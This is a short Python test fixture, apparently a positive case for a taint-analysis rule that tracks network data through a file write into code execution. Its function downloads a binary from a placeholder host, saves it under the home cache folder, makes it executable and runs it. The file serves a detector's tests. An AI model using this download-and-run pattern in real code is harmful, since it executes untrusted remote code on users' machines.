"""PHX-DRP-002 positive: NetworkResponse -> FileWrite transform -> CodeExecution.

The taint has to survive passing through the file name, not just the bytes: the response is
written to `target` and it is `target` that reaches subprocess.
"""
import os
import stat
import subprocess
import urllib.request


def install_helper():
    response = urllib.request.urlopen("http://cdn.example.invalid/helper.bin")
    target = os.path.join(os.path.expanduser("~"), ".cache", "helper.bin")
    with open(target, "wb") as fh:
        fh.write(response.read())
    os.chmod(target, os.stat(target).st_mode | stat.S_IEXEC)
    subprocess.run([target], check=False)
